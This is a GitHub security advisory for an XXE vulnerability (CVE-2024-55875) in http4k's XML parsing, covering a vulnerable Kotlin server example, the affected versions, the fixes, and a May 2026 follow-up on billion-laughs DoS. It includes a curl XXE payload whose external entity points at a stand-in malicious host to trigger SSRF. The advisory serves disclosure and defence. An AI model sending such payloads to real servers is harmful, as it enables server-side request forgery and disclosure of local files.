# [C] http4k has a potential XXE (XML External Entity Injection) vulnerability

## Summary
Severity: Critical
Advisory: GHSA-7mj5-hjjj-8rgw
CVE: CVE-2024-55875
CWE: CWE-200, CWE-611, CWE-918
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-12-12
Source: https://github.com/advisories/GHSA-7mj5-hjjj-8rgw
Type: github-advisory

## Affected
- Maven: `org.http4k:http4k-format-xml` — affected >=0 <6.50.0.0

## Details
### Summary
_Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server._

There is a potential XXE(XML External Entity Injection) vulnerability when http4k handling malicious XML contents within requests, which might allow attackers to read local sensitive information on server, trigger Server-side Request Forgery and even execute code under some circumstances.

### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._
https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46
XML contents is parsed with DocumentBuilder without security settings on or external entity enabled

### PoC
_Complete instructions, including specific configuration details, to reproduce the vulnerability._
#### Example Vulnerable server code:
```
import org.http4k.core.*
import org.http4k.format.Xml.xml
import org.http4k.server.Netty
import org.http4k.server.asServer
import org.w3c.dom.Document

fun main() {

    val xmlLens = Body.xml().toLens()

    // Create an HTTP handler
    val app: HttpHandler = { request ->
        try {
            // Parse the incoming XML payload to a Document object
            val xmlDocument: Document = xmlLens(request)

            // Extract root element name or other details from the XML
            val rootElementName = xmlDocument.documentElement.nodeName

            // Create a response XML based on the extracted information
            val responseXml = """
                <response>
                    <message>Root element is: $rootElementName</message>
                </response>
            """.trimIndent()

            // Respond with XML
            Response(Status.OK).body(responseXml).header("Content-Type", "application/xml")
        } catch (e: Exception) {
            // Handle invalid XML or other errors
            Response(Status.BAD_REQUEST).body("Invalid XML: ${e.message}")
        }
    }

    // Start the server
    val server = app.asServer(Netty(9000)).start()
    println("Server started on http://localhost:9000")
}
```
#### Maven dependency:
```
<dependencies>
        <dependency>
            <groupId>org.jetbrains.kotlin</groupId>
            <artifactId>kotlin-test-junit5</artifactId>
            <version>1.9.0</version>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>org.junit.jupiter</groupId>
            <artifactId>junit-jupiter-engine</artifactId>
            <version>5.10.0</version>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>org.jetbrains.kotlin</groupId>
            <artifactId>kotlin-stdlib</artifactId>
            <version>1.9.0</version>
        </dependency>

        <dependency>
            <groupId>org.http4k</groupId>
            <artifactId>http4k-core</artifactId>
            <version>5.40.0.0</version>
        </dependency>

        <!-- Http4k XML format -->
        <dependency>
            <groupId>org.http4k</groupId>
            <artifactId>http4k-format-xml</artifactId>
            <version>5.40.0.0</version>
        </dependency>

        <!-- http4k Netty -->
        <dependency>
            <groupId>org.http4k</groupId>
            <artifactId>http4k-server-netty</artifactId>
            <version>5.40.0.0</version>
        </dependency>
    </dependencies>
```
#### Exploit payload example to trigger SSRF
`curl -X POST http://localhost:9000 -H "Content-Type: application/xml" -d "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"https://replace.with.your.malicious.website/poc\">]><root>&xxe;</root>"`


### Impact
_What kind of vulnerability is it? Who is impacted?_
The servers that employ this XML parsing feature of http4k are vulnerable to this XXE vulnerability

### Follow-up patch — v6.50.0.0 (May 2026)

The original fix shipped in v5.41.0.0 / v4.50.0.0 closed the documented external-entity attack class (SSRF, local-file disclosure, code execution) by setting `ACCESS_EXTERNAL_DTD=""`, `ACCESS_EXTERNAL_SCHEMA=""`, and `isExpandEntityReferences=false` on the default `DocumentBuilderFactory`.

A residual gap remained: the parser still **accepted** documents containing `<!DOCTYPE>` declarations even though external entity resolution was blocked. This left open billion-laughs-style internal entity expansion DoS attacks against any application using `Body.xml()` or `Document.asXmlDocument()` on untrusted XML.

  **v6.50.0.0** closes this residual by adding `disallow-doctype-decl=true` and `FEATURE_SECURE_PROCESSING=true` to `defaultXmlParsingConfig`. Any document containing a `<!DOCTYPE>` is now rejected at parse time.

#### Follow-up affected & fixed versions

  | Version | Fixed Version |
  |---------|---------------|
  | `>= 5.41.0.0, < 6.50.0.0` | **6.50.0.0** |

v6.x users should upgrade to v6.50.0.0. The patch is part of the v6.50.0.0 release; no separate backport is required for the v6 line. Older v5 / v4 users remain on the v5.41.0.0 / v4.50.0.0 fix (external-entity protection); the billion-laughs residual is fixed in those lines only via http4k EE LTS releases — contact [enterprise@http4k.org](mailto:enterprise@http4k.org) if you need it.

#### Follow-up timeline

  | Date/time (UTC) | Notes |
  |-----------------|-------|
  | 31/05/2026 17:12 | Follow-up patch merged (commit [`c0cfaf5d63`](https://github.com/http4k/http4k/commit/c0cfaf5d63)) with new tests for `<!DOCTYPE>` rejection and billion-laughs payload rejection |
  | 31/05/2026 18:06 | http4k v6.50.0.0 released to Maven Central |

## References
- https://github.com/http4k/http4k/security/advisories/GHSA-7mj5-hjjj-8rgw
- https://nvd.nist.gov/vuln/detail/CVE-2024-55875
- https://github.com/http4k/http4k/commit/35297adc6d6aca4951d50d8cdf17ff87a8b19fbc
- https://github.com/http4k/http4k
- https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46
